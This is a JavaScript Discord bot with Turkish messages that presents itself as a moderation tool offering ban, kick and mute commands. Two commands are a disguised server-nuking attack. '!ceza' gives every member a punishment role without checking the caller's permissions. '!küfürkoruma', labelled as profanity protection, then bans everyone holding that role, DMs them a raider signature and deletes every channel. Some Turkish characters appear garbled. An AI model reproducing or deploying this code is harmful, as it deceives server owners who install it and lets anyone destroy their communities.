require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const prefix = '!';

client.on('ready', () => {
    console.log(`üíõ Bot aktif: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // !tamyasakla @ki≈üi = ki≈üiyi sunucudan banlar
    if (command === 'tamyasakla') {
        const member = message.mentions.members.first();
        if (!member) return message.reply('Yasaklanacak ki≈üiyi etiketlemedin yavrum.');
        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers))
            return message.reply('Bu komutu kullanmak i√ßin iznin yok kuzum.');
        await member.ban({ reason: 'Tamyasakla komutu uygulandƒ±.' });
        message.channel.send(`${member.user.tag} sunucudan tamamen yasaklandƒ±. üåô`);
    }

    // !kick @ki≈üi = ki≈üiyi sunucudan atar
    else if (command === 'kick') {
        const member = message.mentions.members.first();
        if (!member) return message.reply('Kim atƒ±lacaksa onu etiketle l√ºtfen.');
        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers))
            return message.reply('Bu komut i√ßin yetkin yok yavrum.');
        await member.kick('Kick komutu uygulandƒ±.');
        message.channel.send(`${member.user.tag} sunucudan atƒ±ldƒ±. üö™`);
    }

    // !mute @ki≈üi = ki≈üiye zamana≈üƒ±mƒ± verir
    else if (command === 'mute') {
        const member = message.mentions.members.first();
        const duration = parseInt(args[1]) || 5; // dakika cinsinden
        if (!member) return message.reply('Susturulacak ki≈üiyi etiketlemeyi unuttun.');
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers))
            return message.reply('Bu komut i√ßin iznin yok kuzum.');
        const timeout = duration * 60 * 1000;
        await member.timeout(timeout);
        message.channel.send(`${member.user.tag} ${duration} dakika susturuldu. ü§´`);
    }

    // !ceza = sunucudaki herkese Cezalƒ± rol√º verir
    else if (command === 'ceza') {
        const role = message.guild.roles.cache.find(r => r.name === 'Cezalƒ±');
        if (!role) return message.reply('Cezalƒ± rol√º bulunamadƒ±.');
        message.guild.members.cache.forEach(member => {
            if (!member.user.bot) {
                member.roles.add(role).catch(() => {});
            }
        });
        message.channel.send('Sunucudaki herkese **Cezalƒ±** rol√º verildi. üîí');
    }

    // !k√ºf√ºrkoruma = Cezalƒ± rol√º olan herkesi banlar ve t√ºm kanallarƒ± siler
    else if (command === 'k√ºf√ºrkoruma') {
        const role = message.guild.roles.cache.find(r => r.name === 'Cezalƒ±');
        if (!role) return message.reply('Cezalƒ± rol√º bulunamadƒ± yavrum.');

        message.guild.members.cache.forEach(async (member) => {
            if (member.roles.cache.has(role.id)) {
                try {
                    await member.send('TKTlendiniz By. sys.fors & Alilw');
                } catch (err) {
                    console.log(`DM g√∂nderilemedi: ${member.user.tag}`);
                }

                try {
                    await member.ban({ reason: 'K√ºf√ºr korumasƒ± aktif' });
                    console.log(`${member.user.tag} banlandƒ±.`);
                } catch (err) {
                    console.log(`Ban ba≈üarƒ±sƒ±z: ${member.user.tag}`);
                }
            }
        });

        message.guild.channels.cache.forEach(async (channel) => {
            try {
                await channel.delete();
                console.log(`Silindi: ${channel.name}`);
            } catch (err) {
                console.log(`Kanal silinemedi: ${channel.name}`);
            }
        });

        message.channel.send('K√ºf√ºr korumasƒ± tamamlandƒ±. Kanallar temizlendi. ‚ö†Ô∏è');
    }
});

client.login(process.env.TOKEN);
